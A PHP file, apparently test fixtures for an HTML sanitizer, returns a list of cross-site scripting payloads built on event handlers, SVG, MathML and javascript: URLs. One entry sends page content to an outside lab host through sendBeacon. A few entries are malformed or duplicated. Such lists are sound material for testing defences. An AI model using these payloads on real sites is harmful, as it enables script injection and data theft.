<?php

return [
    // Fires after script is executed
    '<xss onafterscriptexecute=alert(1)><script>1</script>',
    // Fires when a CSS animation cancels
    '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>',
    // Fires when a CSS animation ends
    '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>',
    // Fires when a CSS animation repeats
    '<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>',
    // Fires when a CSS animation starts
    '<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>',
    // Fires before the page is printed
    'frameset onbeforeprint=console.log(1)>',
    // Fires before script is executed
    '<xss onbeforescriptexecute=alert(1)><script>1</script>',
    // Fires after if the url changes
    "frameset onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
    // Fires when a svg animation begins
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    // Fires when the marquee bounces
    '<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>',
    // Fires if the resource can be played
    '<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    // Fires when enough data has been loaded to play the resource all the way through
    '<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>',
    // Fires when subtitle changes
    '<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE 1 00:00:00.000 --> 00:00:05.000<b>XSS</b>',
    // Fires when duration changes
    '<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>',
    // Fires when a svg animation ends
    '<svg><animate onend=alert(1) attributeName=x dur=1s>',
    // Fires when the resource is finished playing
    '<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    // Fires when the resource fails to load or causes an error
    '<audio src/onerror=alert(1)>',
    // Fires when the marquee finishes
    '<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>',
    // Fires when the element has focus
    '<a id=x tabindex=1 onfocus=alert(1)></a>',
    // Fires when the element has focus
    '<a id=x tabindex=1 onfocusin=alert(1)></a>',
    // Fires when the element is loaded
    '<frameset onload=alert(1)><frame src="https://example.com"></frameset>',
    // Fires when the first frame is loaded
    '<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    // Fires when the meta data is loaded
    '<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>',
    // Fires when the element finishes loading
    '<image src=validimage.png onloadend=alert(1)>',
    // Fires when the element begins to load
    '<image src=validimage.png onloadstart=alert(1)>',
    // Fires when message event is received from a postMessage call
    '<frameset onmessage=alert(1)><frame src="https://example.com"></frameset>',
    // Fires when the page is shown
    '<frameset onpageshow=alert(1)><frame src="https://example.com"></frameset>',
    // Fires when the resource is played
    '<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    // Style consuming tag
    '<style><img title="</style><img src onerror=alert(1)>"></style>',
    // XSS without greater than
    '<svg onload=alert(1)',
    // Destructuring using onerror
    '<script>var{a:onerror}={a:alert};throw 1</script>',
    // Xlink namespace inside SVG with JavaScript protocol
    '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>',
    // SVG set tag
    '<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>',
    // SVG use element Chrome/Firefox
    "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>",
    // MathML makes any tag clickable
    '<math><x href="javascript:alert(1)">blah',
    // JavaScript protocol with new line
    '<a href="javascript://%0aalert(1)">XSS</a>',
    // Data URL with use element and base64 encoded
    '<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>',
    // Using srcdoc attribute
    '<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>',
    // Using srcdoc with entities
    '<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>',
    //
    "<a href=# onclick=\"window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')\">XSS</a>",
    // Set window.name via parameter on the window.open function
    "<a href=# onclick=\"window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')\">XSS</a>",
    // Set window.name via name attribute in a <iframe> tag
    '<iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe>',
    // Set window.name via usemap attribute in a <img> tag
    '<img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map>',
];
